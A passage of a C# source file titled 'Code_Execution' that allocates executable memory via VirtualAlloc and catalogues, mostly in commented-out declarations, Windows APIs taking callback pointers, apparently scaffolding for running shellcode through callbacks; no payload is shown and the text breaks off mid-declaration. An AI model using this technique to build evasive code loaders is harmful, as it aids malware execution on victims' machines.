using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Code_Execution
{
    internal class Program
    {
        public enum MEM_COMMIT
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_DECOMMIT = 0x4000,
            MEM_RELEASE = 0x8000,
            MEM_FREE = 0x10000,
            MEM_PRIVATE = 0x20000,
            MEM_MAPPED = 0x40000,
            MEM_RESET = 0x80000,
            MEM_TOP_DOWN = 0x100000,
            MEM_WRITE_WATCH = 0x200000,
            MEM_PHYSICAL = 0x400000,
            MEM_IMAGE = 0x1000000
        }
        public enum MEM_PAGE
        {
            PAGE_NOACCESS = 0x1,
            PAGE_READONLY = 0x2,
            PAGE_READWRITE = 0x4,
            PAGE_WRITECOPY = 0x8,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_READWRITECOPY = 0x50,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400,
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            uint size,
            uint flAllocationType,
            uint flProtect
        );

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentThread();

        //[00]
        //acmDriverEnum
        /*
        [DllImport("Msacm32.dll")]
        public extern static void acmDriverEnum(
            IntPtr CallStateCallback,
            uint dwInstance,
            uint fdwEnum
        );
        */

        //[01]
        //acmFormatTagEnum
        /*
        public enum AcmDriverDetailsSupportFlags
        {
            Codec = 0x00000001,
            Converter = 0x00000002,
            Filter = 0x00000004,
            Hardware = 0x00000008,
            Async = 0x00000010,
            Local = 0x40000000,
            Disabled = unchecked((int)0x80000000),
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct AcmFormatTagDetails
        {
            public uint structureSize;
            public int formatTagIndex;
            public int formatTag;
            public int formatSize;
            public AcmDriverDetailsSupportFlags supportFlags;
            public int standardFormatsCount;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = FormatTagDescriptionChars)]
            public string formatDescription;
            public const int FormatTagDescriptionChars = 48;
        }

        [DllImport("Msacm32.dll")]
        public static extern IntPtr acmFormatTagEnum(
            IntPtr hAcmDriver,
            ref AcmFormatTagDetails formatTagDetails,
            IntPtr callback,
            IntPtr instance,
            int reserved
        );
        */

        //[02]
        //BindImageEx
        /*
        [Flags]
        public enum BINDOPTS
        {
            BIND_ALL_IMAGES = 0x00000004,
            BIND_CACHE_IMPORT_DLLS = 0x00000008,
            BIND_NO_BOUND_IMPORTS = 0x00000001,
            BIND_NO_UPDATE = 0x00000002,
            BIND_REPORT_64BIT_VA = 0x00000010,
        }

        [DllImport("Imagehlp.dll")]
        public static extern bool BindImageEx(
            BINDOPTS Flags,
            string ImageName,
            string DllPath,
            string SymbolPath,
            IntPtr StatusRoutine
        );
        */

        //[03]
        //CallWindowProc
        //CallWindowProcA
        //CallWindowProcW
        /*
        [DllImport("user32.dll")]
        public static extern int CallWindowProc(
            IntPtr lpPrevWndFunc,
            int hwnd,
            int MSG,
            int wParam,
            int lParam
        );

        [DllImport("user32.dll")]
        public static extern int CallWindowProcA(
            IntPtr lpPrevWndFunc,
            int hwnd,
            int MSG,
            int wParam,
            int lParam
        );

        [DllImport("user32.dll")]
        public static extern int CallWindowProc(
            IntPtr lpPrevWndFunc,
            int hwnd,
            int MSG,
            int wParam,
            int lParam
        );

         */

        //[04]
        //CDefFolderMenu_Create2
        /*
        [DllImport("Shell32.dll")]
        static extern IntPtr CDefFolderMenu_Create2(
            IntPtr pidlFolder,
            IntPtr hwnd,
            uint cidl,
            IntPtr apidl,
            IntPtr psf,
            IntPtr pfn,
            uint nKeys,
            IntPtr ahkeys,
            out IntPtr ppcm
        );
        */

        //[05]
        //CertCreateContext
        /*
        public delegate void PFN_CRYPT_FREE(IntPtr pv);

        [StructLayout(LayoutKind.Sequential)]
        public struct CERT_CREATE_CONTEXT_PARA
        {
            public uint cbSize;
            public IntPtr pfnFree;
            public IntPtr pvFree;
        }

        public const int CERT_STORE_CERTIFICATE_CONTEXT = 1;
        public const int CERT_STORE_CERTIFICATE_CONTEXT_FLAG = (1) << (CERT_STORE_CERTIFICATE_CONTEXT);
        public const int X509_ASN_ENCODING = 1;
        public const int PKCS_7_ASN_ENCODING = 65536;
        public const int CERT_CREATE_CONTEXT_NOCOPY_FLAG = 1;

        [DllImport("crypt32.dll")]
        public static extern IntPtr CertCreateContext(
            uint dwContextType,
            uint dwEncodingType,
            ref byte pbEncoded,
            uint cbEncoded,
            uint dwFlags,
            ref CERT_CREATE_CONTEXT_PARA pCreatePara
        );
        */

        //[06]
        //CertEnumPhysicalStore
        /*
        private const int CERT_SYSTEM_STORE_CURRENT_USER = 0x00010000;
        private const int CERT_SYSTEM_STORE_LOCAL_MACHINE = 0x00020000;

        [DllImport("Crypt32", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern int CertEnumPhysicalStore(
            string pvSystemStore,
            uint dwFlags,
            int pvArg,
            IntPtr pfnEnum
        );
        */

        //[07]
        //CertEnumSystemStore
        /*
        private const int CERT_SYSTEM_STORE_CURRENT_USER = 0x00010000;
        private const int CERT_SYSTEM_STORE_LOCAL_MACHINE = 0x00020000;

        [DllImport("Crypt32.dll")]
        static extern bool CertEnumSystemStore(
            uint dwFlags,
            IntPtr pvSystemStoreLocationPara,
            IntPtr pvArg,
            IntPtr pfnEnum
        );
        */

        //[08]
        //CertEnumSystemStoreLocation
        /*
        [DllImport("Crypt32.dll")]
        public static extern bool CertEnumSystemStoreLocation(
            uint dwFlags,
            IntPtr pvArg,
            IntPtr pfnEnum
        );
        */

        //[09]
        //ChooseColor
        /*
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct CHOOSECOLOR
        {
            public uint lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hInstance;
            public uint rgbResult;
            public IntPtr lpCustColors;
            public uint Flags;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpTemplateName;
        }

        [DllImport("Comdlg32.dll")]
        public extern static bool ChooseColor(
            ref CHOOSECOLOR lpcc
        );
        */

        //[0A]
        //ChooseFont
        /*
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct CHOOSEFONT
        {
            public int lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hDC;
            public IntPtr lpLogFont;
            public int iPointSize;
            public int Flags;
            public int rgbColors;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            public string lpTemplateName;
            public IntPtr hInstance;
            public string lpszStyle;
            public short nFontType;
            private short __MISSING_ALIGNMENT__;
            public int nSizeMin;
            public int nSizeMax;
        }

        [DllImport("comdlg32.dll")]
        public extern static bool ChooseFont(
            ref CHOOSEFONT lpcf
        );
        */

        //[0B]
        //ClusWorkerCreate
        /*
        struct CLUS_WORKER
        {
            public IntPtr hThread;
            public bool Terminate;
        }

        [DllImport("ResUtils.dll")]
        static extern IntPtr ClusWorkerCreate(
            out CLUS_WORKER lpWorker,
            IntPtr lpStartAddress,
            IntPtr lpParameter
        );

        [DllImport("ResUtils.dll")]
        static extern IntPtr ClusWorkerTerminateEx(
            ref CLUS_WORKER ClusWorker,
            uint TimeoutInMilliseconds,
            bool WaitOnly
        );
        */

        //[0C]
        //CopyFile2
        /*
        [Flags]
        public enum CopyFileFlags : uint
        {
            COPY_FILE_FAIL_IF_EXISTS = 0x00000001,
            COPY_FILE_RESTARTABLE = 0x00000002,
            COPY_FILE_OPEN_SOURCE_FOR_WRITE = 0x00000004,
            COPY_FILE_ALLOW_DECRYPTED_DESTINATION = 0x00000008
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct COPYFILE2_EXTENDED_PARAMETERS
        {
            public uint dwSize;
            public uint dwCopyFlags;
            public IntPtr pfCancel;
            public IntPtr pProgressRoutine;
            public IntPtr pvCallbackContext;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DeleteFileW(
            [MarshalAs(UnmanagedType.LPWStr)] string lpFileName
        );

        [DllImport("Kernel32", CharSet = CharSet.Unicode, BestFitMapping = false)]
        public static extern int CopyFile2(
            string pwszExistingFileName,
            string pwszNewFileName,
            ref COPYFILE2_EXTENDED_PARAMETERS pExtendedParameters
        );
        */

        //[0D]
        //CopyFileEx
        /*
        [Flags]
        public enum CopyFileFlags : uint
        {
            COPY_FILE_FAIL_IF_EXISTS = 0x00000001,
            COPY_FILE_RESTARTABLE = 0x00000002,
            COPY_FILE_OPEN_SOURCE_FOR_WRITE = 0x00000004,
            COPY_FILE_ALLOW_DECRYPTED_DESTINATION = 0x00000008
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DeleteFileW(
            [MarshalAs(UnmanagedType.LPWStr)] string lpFileName
        );

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CopyFileEx(
            string lpExistingFileName,
            string lpNewFileName,
            IntPtr lpProgressRoutine,
            IntPtr lpData,
            ref Int32 pbCancel,
            CopyFileFlags dwCopyFlags
        );
        */

        //[0E]
        //CreateDialogIndirectParam
        //CreateDialogIndirectParamA
        //CreateDialogIndirectParamW
        /*
        [StructLayout(LayoutKind.Sequential)]
        public struct DlgTemplate
        {
            public uint style;
            public uint dwExtendedStyle;
            public ushort cdit;
            public short x;
            public short y;
            public short cx;
            public short cy;
        }

        [DllImport("user32.dll")]
        public static extern IntPtr CreateDialogIndirectParam(
            IntPtr hInstance,
            ref DlgTemplate lpTemplate,
            IntPtr hWndParent,
            IntPtr lpDialogFunc,
            IntPtr dwInitParam
        );

        [DllImport("user32.dll")]
        public static extern IntPtr CreateDialogIndirectParamA(
            IntPtr hInstance,
            ref DlgTemplate lpTemplate,
            IntPtr hWndParent,
            IntPtr lpDialogFunc,
            IntPtr dwInitParam
        );

        [DllImport("user32.dll")]
        public static extern IntPtr CreateDialogIndirectParamW(
            IntPtr hInstance,
            ref DlgTemplate lpTemplate,
            IntPtr hWndParent,
            IntPtr lpDialogFunc,
            IntPtr dwInitParam
        );
        */

        //[0F]
        //CreateThread
        /*
        [DllImport("Kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObject(
            IntPtr Handle,
            uint Wait
        );

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId
        );
        */

        //[10]
        //CreateThreadpoolTimer
        /*
        [StructLayout(LayoutKind.Sequential)]
        public struct FILETIME
        {
            public uint DateTimeLow;
            public uint DateTimeHigh;
        }

        [StructLayout(LayoutKind.Explicit)]
        private struct LargeInteger
        {
            [FieldOffset(0)]
            public int Low;
            [FieldOffset(4)]
            public int High;
            [FieldOffset(0)]
            public long QuadPart;
            public long ToInt64()
            {
                return ((long)this.High << 32) | (uint)this.Low;
            }

            public static LargeInteger FromInt64(long value)
            {
                return new LargeInteger
                {
                    Low = (int)(value),
                    High = (int)((value >> 32))
                };
            }
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThreadpoolTimer(
            IntPtr pfnti,
            IntPtr pv,
            IntPtr pcbe
        );

        [DllImport("kernel32.dll")]
        static extern void SetThreadpoolTimer(
            IntPtr pti,
            ref FILETIME pv,
            uint msPeriod,
            uint msWindowLength
        );

        [DllImport("kernel32.dll")]
        static extern void WaitForThreadpoolTimerCallbacks(
            IntPtr pti,
            bool fCancelPendingCallbacks
        );

        [DllImport("kernel32.dll")]
        static extern void CloseThreadpoolTimer(
            IntPtr pti
        );
        */

        //[11]
        //CreateThreadpoolWait
        /*
        [DllImport("Kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto)]
        public static extern HANDLE CreateEvent(
           HANDLE lpEventAttributes,
           bool bManualReset,
           bool bIntialState,
           string lpName
        );

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThreadpoolWait(
            IntPtr callback_function,
            uint pv,
            uint pcb
        );

        [DllImport("kernel32.dll")]
        public static extern void SetThreadpoolWait(
            IntPtr TP_WAIT_pointer,
            IntPtr Event_handle,
            IntPtr pftTimeout
        );

        [DllImport("kernel32.dll")]
        public static extern void WaitForThreadpoolWaitCallbacks(
            IntPtr TP_WAIT_pointer,
            bool fCancelPendingCallbacks
        );

        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );

        [DllImport("kernel32.dll")]
        static extern bool SetEvent(
            IntPtr hEvent
        );
        */

        //[12]
        //CreateThreadpoolWork
        /*
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThreadpoolWork(
            IntPtr pfnwk,
            IntPtr pv,
            IntPtr pcbe
         );

        [DllImport("kernel32.dll")]
        static extern void SubmitThreadpoolWork(
            IntPtr pwkl
        );

        [DllImport("kernel32.dll")]
        static extern void WaitForThreadpoolWorkCallbacks(
            IntPtr pwk,
            bool fCancelPendingCallbacks
        );

        [DllImport("kernel32.dll")]
        static extern void CloseThreadpoolWork(
            IntPtr pwk
        );
        */

        //[13]
        //CreateTimerQueueTimer
        /*
        public const Int32 INFINITE = -1;
        public const Int32 WAIT_ABANDONED = 0x80;
        public const Int32 WAIT_OBJECT_0 = 0x00;
        public const Int32 WAIT_TIMEOUT = 0x102;
        public const Int32 WAIT_FAILED = -1;

        [DllImport("kernel32.dll", SetLastError = true, EntryPoint = "CreateTimerQueue")]
        public static extern IntPtr CreateTimerQueue();

        public delegate void WaitOrTimerDelegate(IntPtr lpParameter, bool TimerOrWaitFired);
        [DllImport("kernel32.dll")]
        static extern bool CreateTimerQueueTimer(
            out IntPtr phNewTimer,
            IntPtr TimerQueue,
            IntPtr Callback,
            IntPtr Parameter,
            uint DueTime,
            uint Period,
            uint Flags
        );

        [DllImport("Kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto)]
        public static extern HANDLE CreateEvent(
            HANDLE lpEventAttributes,
            [In, MarshalAs(UnmanagedType.Bool)] bool bManualReset,
            [In, MarshalAs(UnmanagedType.Bool)] bool bIntialState,
            [In, MarshalAs(UnmanagedType.BStr)] string lpName
        );

        [DllImport("Kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObject(
            IntPtr Handle, int Wait
        );
        */

        //[14]
        //CryptEnumOIDFunction
        /*
        public const uint CRYPT_MATCH_ANY_ENCODING_TYPE = 0xFFFFFFFF;

        [DllImport("crypt32.dll", EntryPoint = "CryptEnumOIDFunction")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CryptEnumOIDFunction(
            uint dwEncodingType,
            [In][MarshalAs(UnmanagedType.LPStr)] string pszFuncName,
            [In][MarshalAs(UnmanagedType.LPStr)] string pszOID,
            uint dwFlags,
            IntPtr pvArg,
            IntPtr pfnEnumOIDFunc
        );
        */

        //[15]
        //CryptEnumOIDInfo
        /*
        // CryptEnumOIDInfo for Vista and later
        [DllImport("crypt32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CryptEnumOIDInfo(
            OidGroup dwGroupId,
            int dwFlags,
            IntPtr pvArg,
            IntPtr pfnEnumOIDInfo);

        // CryptEnumOIDInfo for Windows 2003 and earlier
        [DllImport("crypt32.dll", EntryPoint = "CryptEnumOIDInfo")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CryptEnumOIDInfoWin2k3(
            OidGroup dwGroupId,
            int dwFlags,
            IntPtr pvArg,
            IntPtr pfnEnumOIDInfo
        );
        */

        //[16]
        //DbgHelpCreateUserDump
        //DbgHelpCreateUserDumpW
        /*
        [DllImport("DbgHelp.dll", ExactSpelling = true)]
        public static extern bool DbgHelpCreateUserDump(
            string FileName,
            IntPtr Callback,
            uint UserData
        );

        [DllImport("DbgHelp.dll", ExactSpelling = true)]
        public static extern bool DbgHelpCreateUserDumpW(
            string FileName,
            IntPtr Callback,
            uint UserData
        );
        */

        //[17]
        //DdeInitialize
        //DdeInitializeA
        //DdeInitializeW
        /*
        [Flags]
		[global::System.CodeDom.Compiler.GeneratedCode("Microsoft.Windows.CsWin32", "0.2.104-beta+6d86f35b75")]
        internal enum DDE_INITIALIZE_COMMAND : uint
        {
            APPCLASS_MONITOR = 0x00000001,
            APPCLASS_STANDARD = 0x00000000,
            APPCMD_CLIENTONLY = 0x00000010,
            APPCMD_FILTERINITS = 0x00000020,
            CBF_FAIL_ALLSVRXACTIONS = 0x0003F000,
            CBF_FAIL_ADVISES = 0x00004000,
            CBF_FAIL_CONNECTIONS = 0x00002000,
            CBF_FAIL_EXECUTES = 0x00008000,
            CBF_FAIL_POKES = 0x00010000,
            CBF_FAIL_REQUESTS = 0x00020000,
            CBF_FAIL_SELFCONNECTIONS = 0x00001000,
            CBF_SKIP_ALLNOTIFICATIONS = 0x003C0000,
            CBF_SKIP_CONNECT_CONFIRMS = 0x00040000,
            CBF_SKIP_DISCONNECTS = 0x00200000,
            CBF_SKIP_REGISTRATIONS = 0x00080000,
            CBF_SKIP_UNREGISTRATIONS = 0x00100000,
            MF_CALLBACKS = 0x08000000,
            MF_CONV = 0x40000000,
            MF_ERRORS = 0x10000000,
            MF_HSZ_INFO = 0x01000000,
            MF_LINKS = 0x20000000,
            MF_POSTMSGS = 0x04000000,
            MF_SENDMSGS = 0x02000000,
        }

        [DllImport("user32.dll")]
        private static extern int DdeInitializeW(
            ref uint id,
            IntPtr cb,
            DDE_INITIALIZE_COMMAND afcmd,
            uint ulres
        );

        [DllImport("user32.dll")]
        static extern int DdeUninitialize(
            uint id
        );

        [DllImport("user32.dll")]
        private static extern IntPtr DdeConnect(
            uint idInst,
            IntPtr hszService,
            IntPtr hszTopic,
            IntPtr pCC
        );
        */

        //[18]
        //DialogBoxIndirectParam
        //DialogBoxIndirectParamA
        //DialogBoxIndirectParamW
        /*
        [StructLayout(LayoutKind.Sequential)]
        public struct DlgTemplate
        {
            public uint style;
            public uint dwExtendedStyle;
            public ushort cdit;
            public short x;
            public short y;
            public short cx;
            public short cy;
        }

        [DllImport("user32.dll")]
        public static extern long DialogBoxIndirectParam(
            IntPtr hInstance,
            ref DlgTemplate hDialogTemplate,
            IntPtr hWndParent,
            IntPtr lpDialogFunc,
            long dwInitParam
        );

        [DllImport("user32.dll")]
        public static extern long DialogBoxIndirectParamA(
            IntPtr hInstance,
            ref DlgTemplate hDialogTemplate,
            IntPtr hWndParent,
            IntPtr lpDialogFunc,
            long dwInitParam
        );

        [DllImport("user32.dll")]
        public static extern long DialogBoxIndirectParamW(
            IntPtr hInstance,
            ref DlgTemplate hDialogTemplate,
            IntPtr hWndParent,
            IntPtr lpDialogFunc,
            long dwInitParam
        );
        */

        //[19]
        //DirectDrawEnumerateEx
        //DirectDrawEnumerateExA
        //DirectDrawEnumerateExW
        /*
        [DllImport("Ddraw.dll")]
        public extern static IntPtr DirectDrawEnumerateEx(
            IntPtr lpCallback,
            IntPtr lpContext,
            uint dwFlags
        );

        [DllImport("Ddraw.dll")]
        public extern static IntPtr DirectDrawEnumerateExA(
            IntPtr lpCallback,
            IntPtr lpContext,
            uint dwFlags
        );

        [DllImport("Ddraw.dll")]
        public extern static IntPtr DirectDrawEnumerateExW(
            IntPtr lpCallback,
            IntPtr lpContext,
            uint dwFlags
        );
        */

        //[1A]
        //DirectSoundCaptureEnumerate
        //DirectSoundCaptureEnumerateA
        //DirectSoundCaptureEnumerateW
        /*
        [DllImport("dsound.dll", SetLastError = true, CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
        public static extern void DirectSoundCaptureEnumerate(
            IntPtr lpDSEnumCallback,
            IntPtr lpContext
        );
        [DllImport("dsound.dll", SetLastError = true, CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
        public static extern void DirectSoundCaptureEnumerateA(
            IntPtr lpDSEnumCallback,
            IntPtr lpContext
        );
        [DllImport("dsound.dll", SetLastError = true, CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
        public static extern void DirectSoundCaptureEnumerateW(
            IntPtr lpDSEnumCallback,
            IntPtr lpContext
        );
        */

        //[1B]
        //DirectSoundEnumerate
        //DirectSoundEnumerateA
        //DirectSoundEnumerateW
        /*
        [DllImport("dsound.dll", SetLastError = true, CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
        static extern IntPtr DirectSoundEnumerateA(
            IntPtr lpDSEnumCallback,
            IntPtr lpContext
        );

        [DllImport("dsound.dll", SetLastError = true, CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
        static extern IntPtr DirectSoundEnumerateA(
            IntPtr lpDSEnumCallback,
            IntPtr lpContext
        );

        [DllImport("dsound.dll", SetLastError = true, CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
        static extern IntPtr DirectSoundEnumerateW(
            IntPtr pDSEnumCallback,
            IntPtr pContext
        );
        */

        //[1C]
        //DnsStartMulticastQuery
        /*
        public struct MDNS_QUERY_REQUEST
        {
            public uint Version;
            public uint ulRefCount;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string Query;
            public ushort QueryType;
            public UInt64 QueryOptions;
            public uint InterfaceIndex;
            public IntPtr pQueryCallback;
            public IntPtr pQueryContext;
            public bool fAnswerReceived;
            public uint ulResendCount;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct MDNS_QUERY_HANDLE
        {
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string nameBuf;
            public ushort wType;
            public IntPtr pSubscription;
            public IntPtr pWnfCallbackParams;
            public ulong stateNameData;
        }

        [DllImport("dnsapi.dll")]
        public extern static long DnsStartMulticastQuery(
            MDNS_QUERY_REQUEST pQueryRequest,
            out MDNS_QUERY_HANDLE pHandle
        );

        [DllImport("dnsapi.dll")]
        public extern static long DnsStopMulticastQuery(
            ref MDNS_QUERY_HANDLE pHandle
        );
        */

        //[1D]
        //DrawState
        //DrawStateA
        //DrawStateW
        /*
        [DllImport("user32.dll", EntryPoint = "GetDC", CharSet = CharSet.Auto)]
        public static extern IntPtr GetDC(
            IntPtr hWnd
        );

        [DllImport("user32.dll")]
        public static extern int DrawState(
            IntPtr hdc,
            IntPtr hBrush,
            IntPtr qfnCallBack,
            IntPtr lData,
            IntPtr wData,
            int x, int y, int width, int height,
            uint uFlags
        );

        [DllImport("user32.dll")]
        public static extern int DrawStateA(
            IntPtr hdc,
            IntPtr hBrush,
            IntPtr qfnCallBack,
            IntPtr lData,
            IntPtr wData,
            int x, int y, int width, int height,
            uint uFlags
        );

        [DllImport("user32.dll")]
        public static extern int DrawStateW(
            IntPtr hdc,
            IntPtr hBrush,
            IntPtr qfnCallBack,
            IntPtr lData,
            IntPtr wData,
            int x, int y, int width, int height,
            uint uFlags
        );

        [DllImport("user32.dll", EntryPoint = "ReleaseDC", CharSet = CharSet.Auto)]
        public static extern int ReleaseDC(
            IntPtr hWnd,
            IntPtr hDC
        );
        */

        //[1E]
        //DSA_EnumCallback
        /*
        [DllImport("Comctl32.dll")]
        static extern IntPtr DSA_Create(
            int cbItem,
            int cItemGrow
        );

        [DllImport("Comctl32.dll")]
        static extern void DSA_InsertItem(
             IntPtr hdsa,
             int i,
             IntPtr pItem
        );

        [DllImport("Comctl32.dll")]
        static extern void DSA_EnumCallback(
             IntPtr hdsa,
             IntPtr pfnCB,
             IntPtr pData
        );

        [DllImport("Comctl32.dll")]
        static extern bool DSA_Destroy(
            IntPtr hdsa
        );
        */

        //[1F]
        //EnumCalendarInfo
        //EnumCalendarInfoA
        //EnumCalendarInfoW
        /*
        public const uint LOCALE_USER_DEFAULT = 0x00000400;
        private const uint LOCALE_ICALENDARTYPE = 0x00001009;
        private const uint LOCALE_SSHORTDATE = 0x0000001F;
        private const uint LOCALE_SLONGDATE = 0x00000020;
        private const uint LOCALE_SYEARMONTH = 0x00001006;

        private const uint ENUM_ALL_CALENDARS = 0xffffffff;

        private const uint CAL_ICALINTVALUE = 0x00000001;
        private const uint CAL_RETURN_GENITIVE_NAMES = 0x10000000;
        private const uint CAL_NOUSEROVERRIDE = 0x80000000;
        private const uint CAL_SMONTHDAY = 0x00000038;
        private const uint CAL_SSHORTDATE = 0x00000005;
        private const uint CAL_SLONGDATE = 0x00000006;
        private const uint CAL_SYEARMONTH = 0x0000002f;
        private const uint CAL_SDAYNAME7 = 0x0000000d;
        private const uint CAL_SABBREVDAYNAME7 = 0x00000014;
        private const uint CAL_SMONTHNAME1 = 0x00000015;
        private const uint CAL_SABBREVMONTHNAME1 = 0x00000022;
        private const uint CAL_SSHORTESTDAYNAME7 = 0x00000037;
        private const uint CAL_SERASTRING = 0x00000004;
        private const uint CAL_SABBREVERASTRING = 0x00000039;

        [DllImport("kernel32")]
        public static extern int EnumCalendarInfo(
            IntPtr lpCalInfoEnumProc,
            uint Locale,
            uint Calendar,
            uint CalType
        );

        [DllImport("kernel32")]
        public static extern int EnumCalendarInfoA(
            IntPtr lpCalInfoEnumProc,
            uint Locale,
            uint Calendar,
            uint CalType
        );

        [DllImport("kernel32")]
        public static extern int EnumCalendarInfoW(
            IntPtr lpCalInfoEnumProc,
            uint Locale,
            uint Calendar,
            uint CalType
        );
        */

        //[20]
        //EnumCalendarInfoEx
        /*
        public const int LOCALE_USER_DEFAULT = 0x0400;
        public const uint ENUM_ALL_CALENDARS = 0xffffffff;
        public const uint CAL_SMONTHNAME1 = 0x00000015;

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumCalendarInfoEx(
            IntPtr lpCalInfoEnumProcEx,
            uint Locale,
            uint Calendar,
            uint CalType
        );
        */

        //[21]
        //EnumChildWindows
        /*
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumChildWindows(
            IntPtr hwndParent,
            IntPtr lpEnumFunc,
            IntPtr lParam
        );
        */

        //[22]
        //EnumDateFormats
        //EnumDateFormatsA
        //EnumDateFormatsW
        /*
        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumDateFormats(
            IntPtr lpDateFmtEnumProc,
            uint Locale,
            uint dwFlags
        );

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumDateFormatsA(
            IntPtr lpDateFmtEnumProc,
            uint Locale,
            uint dwFlags
        );

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumDateFormatsW(
            IntPtr lpDateFmtEnumProc,
            uint Locale,
            uint dwFlags
        );
        */

        //[23]
        //EnumDateFormatsEx
        /*
        [DllImport("kernel32.dll")]
        static extern bool EnumDateFormatsEx(
            IntPtr lpDateFmtEnumProcEx,
            uint Locale,
            uint dwFlags
        );
        */

        //[24]
        //EnumDateFormatsExEx
        /*
        [Flags]
        public enum GetDateFormatFlags : uint
        {
            DATE_AUTOLAYOUT = 0x00000040,
            DATE_LONGDATE = 0x00000002,
            DATE_LTRREADING = 0x00000010,
            DATE_RTLREADING = 0x00000020,
            DATE_SHORTDATE = 0x00000001,
            DATE_USE_ALT_CALENDAR = 0x00000004,
            DATE_YEARMONTH = 0x00000008,
            DATE_MONTHDAY = 0x00000080
        }

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumDateFormatsExEx(
            IntPtr Callback,
            string LocaleName,
            GetDateFormatFlags Format,
            uint lParam
        );
        */

        //[25]
        //EnumDesktops
        //EnumDesktopsA
        //EnumDesktopsW
        /*
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr GetProcessWindowStation();

        [DllImport("user32.dll")]
        static extern bool EnumDesktops(
            IntPtr hwinsta,
            IntPtr lpEnumFunc,
            IntPtr lParam
        );

        [DllImport("user32.dll")]
        static extern bool EnumDesktopsA(
            IntPtr hwinsta,
            IntPtr lpEnumFunc,
            IntPtr lParam
        );

        [DllImport("user32.dll")]
        static extern bool EnumDesktopsW(
            IntPtr hwinsta,
            IntPtr lpEnumFunc,
            IntPtr lParam
        );
        */

        //[26]
        //EnumDesktopWindows
        /*
        [DllImport("kernel32.dll")]
        static extern uint GetCurrentThreadId();

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetThreadDesktop(
            uint dwThreadId
        );

        [DllImport("user32.dll")]
        static extern bool EnumDesktopWindows(
            IntPtr hDesktop,
            IntPtr lpfn,
            IntPtr lParam
        );
        */

        //[27]
        //EnumDirTree
        //EnumDirTreeA
        //EnumDirTreeW
        /*
        [DllImport("Dbghelp.dll")]
        private static extern bool SymInitialize(
            IntPtr hProcess,
            string UserSearchPath,
            bool fInvadeProcess
        );

        [DllImport("DbgHelp", ExactSpelling = true)]
        public static extern bool EnumDirTree(
            HANDLE hProcess,
            string RootPath,
            string InputPathName,
            string OutputPathBuffer,
            IntPtr cb,
            IntPtr data
        );

        [DllImport("DbgHelp", ExactSpelling = true)]
        public static extern bool EnumDirTreeA(
